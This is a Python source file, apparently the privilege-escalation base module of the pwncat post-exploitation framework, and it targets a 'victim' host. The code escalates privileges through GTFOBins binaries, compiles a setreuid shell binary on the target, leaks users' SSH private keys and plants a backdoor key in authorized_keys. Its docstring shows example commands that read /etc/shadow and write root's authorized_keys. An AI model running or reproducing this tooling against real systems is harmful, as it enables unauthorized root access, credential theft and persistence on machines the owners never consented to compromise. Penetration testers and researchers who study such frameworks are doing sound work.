#!/usr/bin/env python3
from typing import List, Dict, Tuple
from io import BytesIO, StringIO
import dataclasses
import textwrap
import time
import os

# import rich.prompt

import pwncat
from pwncat.modules import (
    BaseModule,
    Argument,
    Status,
    Bool,
    Result,
    ArgumentFormatError,
    ModuleFailed,
)
from pwncat.modules.persist import PersistType, PersistModule, PersistError
from pwncat.gtfobins import Capability
from pwncat.file import RemoteBinaryPipe
from pwncat.util import CompilationError


class EscalateError(ModuleFailed):
    """ Indicates an error while attempting some escalation action """


def fix_euid_mismatch(
    escalate: "EscalateModule", exit_cmd: str, target_uid: int, target_gid: int
):
    """ Attempt to gain EUID=UID=target_uid.

    This is intended to fix EUID/UID mismatches after a escalation.
    """

    pythons = [
        "python",
        "python3",
        "python3.6",
        "python3.8",
        "python3.9",
        "python2.7",
        "python2.6",
    ]
    for python in pythons:
        python_path = pwncat.victim.which(python)
        if python_path is not None:
            break

    if python_path is not None:
        command = f"exec {python_path} -c '"
        command += f"""import os; os.setreuid({target_uid}, {target_uid}); os.setregid({target_gid}, {target_gid}); os.system("{pwncat.victim.shell}")"""
        command += "'\n"
        pwncat.victim.process(command)

        new_id = pwncat.victim.id
        if new_id["uid"]["id"] == target_uid and new_id["gid"]["id"] == target_gid:
            return

    try:
        # Try to compile a binary
        remote_binary = pwncat.victim.compile(
            [
                StringIO(
                    textwrap.dedent(
                        f"""
                        #include <stdio.h>
                        #include <unistd.h>
                        int main() {{
                            setreuid({target_uid}, {target_uid});
                            setregid({target_gid}, {target_gid});
                            execl("{pwncat.victim.shell}", "{pwncat.victim.shell}", NULL);
                        }}
                        """
                    )
                )
            ]
        )
        pwncat.victim.run(remote_binary, wait=False)

        # Check id again
        new_id = pwncat.victim.id
        if new_id["uid"]["id"] == target_uid and new_id["gid"]["id"] == target_gid:
            pwncat.victim.run(f"rm -f {remote_binary}")
            return
        else:
            pwncat.victim.run(f"rm -f {remote_binary}")
    except CompilationError:
        pass

    for module in pwncat.modules.match("persist.*", base=PersistModule):
        if PersistType.LOCAL not in module.TYPE:
            continue

        try:
            module.run(
                progress=escalate.progress,
                user=pwncat.victim.find_user_by_id(target_uid),
            )
        except PersistError:
            continue

        try:
            module.run(
                progress=escalate.progress,
                user=pwncat.victim.find_user_by_id(target_uid),
                escalate=True,
            )
        except PersistError:
            module.run(
                progress=escalate.progress,
                user=pwncat.victim.find_user_by_id(target_uid),
                remove=True,
            )
            continue

        return "exit\n" + exit_cmd

    pwncat.victim.client.send(exit_cmd.encode("utf-8"))
    pwncat.victim.flush_output()

    raise EscalateError("failed to resolve euid/uid mismatch")


def euid_fix(technique_class):
    """
    Decorator for Technique classes which may end up with a RUID/EUID
    mismatch. This will check the resulting UID after to see
    if the change was affective and attempt to fix it.
    """

    class Wrapper(technique_class):
        def exec(self, binary: str):

            # Run the real exec
            result = super(Wrapper, self).exec(binary)

            # Check id again
            ending_id = pwncat.victim.id

            # If needed fix the UID
            if ending_id["euid"]["id"] != ending_id["uid"]["id"]:
                fix_euid_mismatch(
                    self.module,
                    result,
                    ending_id["euid"]["id"],
                    ending_id["egid"]["id"],
                )

            return result

    return Wrapper


@dataclasses.dataclass
class Technique:
    """ Describes a technique possible through some module.

    Modules should subclass this class in order to implement
    their techniques. Only the methods corresponding to the
    returned `caps` need be implemented.
    """

    caps: Capability
    """ What capabilities this technique provides """
    user: str
    """ The user this provides access as """
    module: "EscalateModule"
    """ The module which provides these capabilities """

    def write(self, filepath: str, data: bytes):
        raise NotImplementedError

    def read(self, filepath: str):
        raise NotImplementedError

    def exec(self, binary: str):
        raise NotImplementedError

    def __str__(self):

        cap_names = {
            Capability.READ: "file read",
            Capability.WRITE: "file write",
            Capability.SHELL: "shell",
        }

        return (
            f"[magenta]{cap_names[self.caps]}[/magenta] as [green]{self.user}[/green] "
            f"via {self.module.human_name(self)}"
        )


class GTFOTechnique(Technique):
    """ A technique which is based on a GTFO binary """

    def __init__(
        self,
        target_user: str,
        module: "EscalateModule",
        method: pwncat.gtfobins.MethodWrapper,
        **kwargs,
    ):
        super(GTFOTechnique, self).__init__(method.cap, target_user, module)
        self.method = method
        self.kwargs = kwargs

    def write(self, filepath: str, data: str):

        payload, input_data, exit_cmd = self.method.build(
            lfile=filepath, length=len(data), **self.kwargs
        )

        mode = "w"
        if self.method.stream is pwncat.gtfobins.Stream.RAW:
            mode += "b"

        try:
            printable = pwncat.util.isprintable(data)
        except UnicodeDecodeError:
            printable = False

        if self.method.stream == pwncat.gtfobins.Stream.PRINT and not printable:
            raise EscalateError(f"{self}.write: input data not printable")

        # Run the command
        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        # Write the data and close the process
        with self.method.wrap_stream(pipe) as pipe:
            pipe.write(data.encode("utf-8"))

    def read(self, filepath: str):

        payload, input_data, exit_cmd = self.method.build(lfile=filepath, **self.kwargs)

        mode = "r"
        if self.method.stream is pwncat.gtfobins.Stream.RAW:
            mode += "b"

        pipe = pwncat.victim.subprocess(
            payload,
            mode,
            data=input_data.encode("utf-8"),
            exit_cmd=exit_cmd.encode("utf-8"),
            no_job=True,
        )

        return self.method.wrap_stream(pipe)

    def exec(self, binary: str):

        payload, input_data, exit_cmd = self.method.build(shell=binary, **self.kwargs)

        # Run the initial command
        pwncat.victim.run(payload, wait=False)

        # Send required input
        pwncat.victim.client.send(input_data.encode("utf-8"))

        # Return the command to close out completely
        return exit_cmd


@dataclasses.dataclass
class FileContentsResult(Result):
    """ Result which contains the contents of a file """

    filepath: str
    pipe: RemoteBinaryPipe
    data: bytes = None

    @property
    def category(self):
        return None

    @property
    def title(self):
        return f"Contents of {self.filepath}"

    @property
    def description(self):
        with self.stream:
            return self.stream.read().decode("utf-8")

    @property
    def stream(self):
        if self.pipe is not None:
            with self.pipe:
                self.data = self.pipe.read()
            self.pipe = None

        return BytesIO(self.data)


@dataclasses.dataclass
class EscalateChain(Result):
    """ Chain of techniques used to escalate """

    user: str
    """ Initial user before escalation """
    chain: List[Tuple[Technique, str]]
    """ Chain of techniques used to escalate """

    @property
    def category(self):
        return None

    @property
    def title(self):
        return "Escalation Route"

    @property
    def description(self):
        result = []
        for i, (technique, _) in enumerate(self.chain):
            result.append(f"{(i+1)*' '}[yellow]\u2ba1[/yellow] {technique}")
        return "\n".join(result)

    def add(self, technique: Technique, exit_cmd: str):
        """ Add a link in the chain """
        self.chain.append((technique, exit_cmd))

    def extend(self, chain: "EscalateChain"):
        """ Extend this chain with another chain """
        self.chain.extend(chain.chain)

    def pop(self):
        """ Exit and remove the last link in the chain """
        _, exit_cmd = self.chain.pop()
        pwncat.victim.client.send(exit_cmd.encode("utf-8"))
        pwncat.victim.reset(hard=False)
        pwncat.victim.update_user()

    def unwrap(self):
        """ Exit each shell in the chain with the provided exit script """

        # Go through the chain in reverse
        for technique, exit_cmd in self.chain[::-1]:
            # Send the exit command
            pwncat.victim.client.send(exit_cmd.encode("utf-8"))

        pwncat.victim.reset(hard=False)
        pwncat.victim.update_user()


@dataclasses.dataclass
class EscalateResult(Result):
    """ The result of running an escalate module. This object contains
    all the enumerated techniques and provides an abstract way to employ
    the techniques to attempt privilege escalation.
    """

    techniques: Dict[str, List[Technique]]
    """ List of techniques available keyed by the user """

    @property
    def category(self):
        return None

    @property
    def title(self):
        return "Escalation Techniques"

    @property
    def description(self):

        result = []
        for user, techniques in self.techniques.items():
            for technique in techniques:
                result.append(f"  - {technique}")

            return "\n".join(result)

    def extend(self, result: "EscalateResult"):
        """ Extend this result with another escalation enumeration result.
        This allows you to enumerate multiple modules and utilize all their
        techniques together to perform escalation. """

        for key, value in result.techniques.items():
            if key not in self.techniques:
                self.techniques[key] = value
            else:
                self.techniques[key].extend(value)

    def add(self, technique: Technique):
        """ Add a new technique to this result object """
        if technique.user not in self.techniques:
            self.techniques[technique.user] = [technique]
        else:
            self.techniques[technique.user].append(technique)

    def write(
        self, user: str, filepath: str, data: bytes, progress, no_exec: bool = False
    ):
        """ Attempt to use all the techniques enumerated to write to a file
        as the given user """

        if user not in self.techniques:
            raise EscalateError(f"file write as {user} not possible")

        # See if we can perform this action directly
        for technique in self.techniques[user]:
            if Capability.WRITE in technique.caps:
                try:
                    technique.write(filepath, data)
                    return technique
                except EscalateError:
                    continue

        if no_exec:
            raise EscalateError(f"file write as {user} not possible")

        # Can't perform directly. Can we escalate to the user with a shell?
        try:
            exit_cmd = self.exec(user, shell="/bin/sh", progress=progress)
        except EscalateError:
            raise EscalateError(f"file write as {user} not possible")

        # We are now running in a shell as this user, just write the file
        try:
            with pwncat.victim.open(filepath, "w", length=len(data)) as filp:
                filp.write(data)
        except (PermissionError, FileNotFoundError):
            raise EscalateError(f"file write as {user} not possible")

        # Send the exit command to return to the previous user/undo what we
        # did to get here.
        exit_cmd.unwrap()

        return exit_cmd.chain[0][0]

    def read(self, user: str, filepath: str, progress, no_exec: bool = False):
        """ Attempt to use all the techniques enumerated to read a file
        as the given user """

        if user not in self.techniques:
            raise EscalateError(f"file read as {user} not possible")

        # See if we can perform this action directly
        for technique in self.techniques[user]:
            if Capability.READ in technique.caps:
                try:
                    return technique.read(filepath), technique
                except EscalateError:
                    continue

        if no_exec:
            raise EscalateError(f"file read as {user} not possible")

        # Can't perform directly. Can we escalate to the user with a shell?
        try:
            exit_cmd = self.exec(user, shell="/bin/sh", progress=progress)
        except EscalateError:
            raise EscalateError(f"file read as {user} not possible")

        # We are now running in a shell as this user, just write the file
        try:
            filp = pwncat.victim.open(filepath, "r",)
            # Our exit command needs to be run as well when the file is
            # closed
            original_close = filp.close

            def new_close():
                original_close()
                exit_cmd.unwrap()

            filp.close = new_close

            return filp, exit_cmd.chain[0][0]
        except (PermissionError, FileNotFoundError):
            raise EscalateError(f"file read as {user} not possible")

    def read_auth_keys(self, user: str, progress):
        """ Attempt to read the users authorized keys file. """

        for fact in pwncat.modules.run(
            "enumerate.gather", types=["service.sshd.config"], progress=progress
        ):
            if "AuthorizedKeysFile" in fact.data:
                authkeys_paths = fact.data["AuthorizedKeysFile"].split(" ")
                for i in range(len(authkeys_paths)):
                    path = authkeys_paths[i].replace("%%", "%")
                    path = path.replace("%h", pwncat.victim.users[user].homedir)
                    path = path.replace("%u", user)
                    if not path.startswith("/"):
                        path = os.path.join(pwncat.victim.users[user].homedir, path)
                    authkeys_paths[i] = path
                break
            if "AuthorizedKeysCommand" in fact.data:
                authkeys_paths = []
                break
        else:
            authkeys_paths = [
                os.path.join(pwncat.victim.users[user].homedir, ".ssh/authorized_keys")
            ]

        # Failed
        if not authkeys_paths:
            return None

        try:
            for path in authkeys_paths:
                filp, _ = self.read(user, path, progress, no_exec=True)
                with filp:
                    authkeys = (
                        filp.read()
                        .strip()
                        .decode("utf-8")
                        .replace("\r\n", "\n")
                        .split("\n")
                    )
                    authkeys_path = path
        except EscalateError:
            authkeys = None
            authkeys_path = None if not authkeys_paths else authkeys_paths[0]

        return authkeys, authkeys_path

    def leak_private_key(self, user: str, progress, auth_keys: List[str]):
        """ Attempt to leak a user's private key """

        privkey_names = ["id_rsa"]
        for privkey_name in privkey_names:
            privkey_path = os.path.join(
                pwncat.victim.users[user].homedir, ".ssh", privkey_name
            )
            pubkey_path = privkey_path + ".pub"

            try:
                filp, technique = self.read(user, privkey_path, progress, no_exec=True)
                with filp:
                    privkey = (
                        filp.read().replace(b"\r\n", b"\n").decode("utf-8").rstrip("\n")
                        + "\n"
                    )
            except EscalateError:
                progress.log(f"reading failed :(")
                continue

            try:
                filp, _ = self.read(user, pubkey_path, progress, no_exec=True)
                with filp:
                    pubkey = filp.read().strip().decode("utf-8")
            except EscalateError:
                pubkey = None

            # If we have authorized keys and a public key,
            # verify this key is valid
            if auth_keys is not None and pubkey is not None:
                if pubkey not in auth_keys:
                    continue

            return privkey, technique

        return None, None

    def write_authorized_key(
        self, user: str, pubkey: str, authkeys: List[str], authkeys_path: str, progress
    ):
        """ Attempt to Write the given public key to the user's authorized
        keys file. Return True if successful, otherwise return False.

        The authorized keys file will be overwritten with the contents of the given
        authorized keys plus the specified public key. You should read the authorized
        keys file first in order to not clobber any existing keys.
        """

        try:
            authkeys.append(pubkey.rstrip("\n"))
            data = "\n".join(authkeys)
            data = data.rstrip("\n") + "\n"
            technique = self.write(
                user, authkeys_path, data.encode("utf-8"), progress, no_exec=True
            )
        except EscalateError:
            return None

        return technique

    def exec(self, user: str, shell: str, progress):
        """ Attempt to use all the techniques enumerated to execute a
        shell as the specified user """

        original_user = pwncat.victim.current_user
        original_id = pwncat.victim.id
        target_user = pwncat.victim.users[user]
        task = progress.add_task("", module="escalating", status="...")

        # Ensure all output is flushed
        pwncat.victim.flush_output()

        # Ensure we are in a safe directory
        pwncat.victim.chdir("/tmp")

        if user in self.techniques:
            for technique in self.techniques[user]:
                if Capability.SHELL in technique.caps:
                    try:
                        progress.update(task, status=str(technique))
                        exit_cmd = technique.exec(shell)

                        # These are evil, but required due to latency... :/
                        time.sleep(0.1)

                        # Ensure we are stable
                        pwncat.victim.reset(hard=False)
                        pwncat.victim.update_user()

                        # Check that the escalation succeeded
                        new_id = pwncat.victim.id
                        if new_id["euid"]["id"] != target_user.id:
                            pwncat.victim.client.send(exit_cmd.encode("utf-8"))
                            pwncat.victim.flush_output(some=False)
                            continue

                        progress.update(task, visible=False, done=True)

                        return EscalateChain(
                            original_user.name, [(technique, exit_cmd)]
                        )
                    except EscalateError:
                        continue

        progress.update(task, status="checking for ssh server")

        # Enumerate system services loooking for an sshd service
        sshd = None
        for fact in pwncat.modules.run(
            "enumerate.gather", progress=progress, types=["system.service"]
        ):
            if "sshd" in fact.data.name and fact.data.state == "running":
                sshd = fact.data

        # Look for the `ssh` binary
        ssh_path = pwncat.victim.which("ssh")

        # If ssh is running, and we have a local `ssh`, then we can
        # attempt to leak private keys via readers/writers and
        # escalate with an ssh user@localhost
        if sshd is not None and sshd.state == "running" and ssh_path:

            # Read the user's authorized keys
            progress.update(task, status="attempting to read authorized keys")
            authkeys, authkeys_path = self.read_auth_keys(user, progress)

            # Attempt to read private key
            progress.update(task, status="attempting to read private keys")
            privkey, used_tech = self.leak_private_key(user, progress, authkeys)

            # We couldn't read the private key
            if privkey is None:

                try:
                    # Read our backdoor private key
                    with open(pwncat.victim.config["privkey"], "r") as filp:
                        privkey = filp.read()
                    with open(pwncat.victim.config["privkey"] + ".pub", "r") as filp:
                        pubkey = filp.read()

                    if authkeys is None:
                        # This is important. Ask the user if they want to
                        # clobber the authorized keys
                        progress.stop()
                        if rich.prompt.Confirm(
                            "could not read authorized keys; attempt to clobber user keys?"
                        ):
                            authkeys = []
                        progress.start()

                    # Attempt to write to the authorized keys file
                    if authkeys is None:
                        progress.update(
                            task, status="attemping to write authorized keys"
                        )
                        used_tech = self.write_authorized_key(
                            user, pubkey, authkeys, authkeys_path, progress
                        )
                        if used_tech is None:
                            privkey = None

                except (FileNotFoundError, PermissionError):
                    privkey = None

            if privkey is not None:

                # Write the private key to a temporary file for local usage
                progress.update(task, status="uploading private key")
                with pwncat.victim.tempfile("w", length=len(privkey)) as filp:
                    filp.write(privkey)
                    privkey_path = filp.name

                # Ensure we track this new file
                tamper = pwncat.victim.tamper.created_file(privkey_path)
                # SSH needs strict permissions
                progress.update(task, status="fixing private key permissions")
                pwncat.victim.run(f"chmod 600 {privkey_path}")

                # First, run a test to make sure we authenticate
                progress.update(task, status="testing local escalation")
                command = (
                    f"{ssh_path} -i {privkey_path} -o StrictHostKeyChecking=no -o PasswordAuthentication=no "
                    f"{user}@127.0.0.1"
                )
                output = pwncat.victim.run(f"{command} echo good")

                # We failed. Remove the private key and raise an
                # exception
                if b"good" not in output:
                    tamper.revert()
                    pwncat.victim.tamper.remove(tamper)
                    raise EscalateError("ssh private key failed")

                # The test worked! Run the real escalate command
                progress.update(task, status="escalating via ssh!")
                pwncat.victim.process(command)

                pwncat.victim.reset(hard=False)
                pwncat.victim.update_user()

                progress.update(task, visible=False, done=True)

                return EscalateChain(original_user.name, [(used_tech, "exit")])

        progress.update(task, visible=False, done=True)

        raise EscalateError(f"exec as {user} not possible")


class EscalateModule(BaseModule):
    """ The base module for all escalation modules.

    I want using the escalate modules to look something like this:

    # Look for techniques but don't perform escalation
    run escalate.auto user=root
    # Escalate to root automatically (e.g. enumerate all modules)
    run escalate.auto exec user=root shell=/bin/bash
    # Write a file as another user
    run escalate.auto write user=root path=/root/.ssh/authorized_keys content=~/.ssh/id_rsa.pub
    # Read a file as another user
    run escalate.auto read user=root path=/etc/shadow

    That is all "auto" module stuff. However, each individual module
    should have the same interface. Individual modules may require or
    accept other arguments from the standard if needed. During auto
    escalation, modules that require extra parameters which aren't
    specified will be ignored. From a code perspective, I'd like
    interaction with these modules to look like this:

    # Retrieve a list of techniques from the module
    escalate = pwncat.modules.run("escalate.sudo")
    # This escalation result object has methods for performing
    # escalation, but also conforms to the `Result` interface
    # for easily displaying the results.
    escalate.exec("root", shell="/bin/bash")

    # The auto module can easily collect results from
    # multiple modules in order to build a more comprehensive
    # escalation primitive
    escalate = EscalateResult(techniques={})
    for module in modules:
        escalate.extend(module.run(**kwargs))
    escalate.exec("root", shell="/bin/bash")

    As with persistence modules, if you need extra arguments for a
    specialized escalation module, you should define your arguments like so:

    ARGUMENTS = {
        **EscalateModule.ARGUMENTS,
        "custom_arg": Argument(str)
    }

    """

    ARGUMENTS = {
        "user": Argument(
            str, default="root", help="The user you would like to escalate to"
        ),
        "exec": Argument(
            Bool, default=False, help="Attempt escalation only using this module"
        ),
        "write": Argument(
            Bool, default=False, help="Attempt to write a file using this module"
        ),
        "read": Argument(
            Bool, default=False, help="Attempt to read a file using this module"
        ),
        "shell": Argument(str, default="current", help="The shell to use for exec"),
        "path": Argument(str, default=None, help="The file to read/write"),
        "data": Argument(str, default=None, help="The data to write to a file"),
    }
    # This causes the BaseModule to collapse a single generator result
    # into it's value as opposed to returning a list with one entry.
    # This allows us to use `yield Status()` to update the progress
    # while still returning a single value
    COLLAPSE_RESULT = True

    def run(self, user, exec, read, write, shell, path, data, **kwargs):
        """ This method is not overriden by subclasses. Subclasses should
        override the `enumerate`, `write`, `read`, and `exec` methods.

        Running a module results in an EnumerateResult object which can be
        formatted by the default `run` command or used to execute various
        privilege escalation primitives utilizing the techniques enumerated.
        """

        if (exec + read + write) > 1:
            raise ArgumentFormatError(
                "only one of exec, read, and write may be specified"
            )

        if path is None and (read or write):
            raise ArgumentFormatError("path not specified for read/write")

        if data is None and write:
            raise ArgumentFormatError("data not specified for write")

        result = EscalateResult({})

        yield Status("gathering techniques")

        for technique in self.enumerate(**kwargs):
            yield Status(technique)
            result.add(technique)

        if shell == "current":
            shell = pwncat.victim.shell

        if exec:
            yield result.exec(user=user, shell=shell, progress=self.progress)
        elif read:
            filp = result.read(user=user, filepath=path, progress=self.progress)
            yield FileContentsResult(path, filp)
        elif write:
            yield result.write(
                user=user, filepath=path, data=data, progress=self.progress
            )
        else:
            yield result

    def enumerate(self, **kwargs):
        """ Enumerate techniques for this module which can perform the
        requested some of the requested capabilities. This should be
        a generator, and yield individual techniques. Techniques are
        self-contained objects which can perform the enumerated
        capabilities. """

        while False:
            yield None

        raise NotImplementedError

    def human_name(self, tech: "Technique"):
        """ Defines the human readable name/description of this vuln """
        return self.name
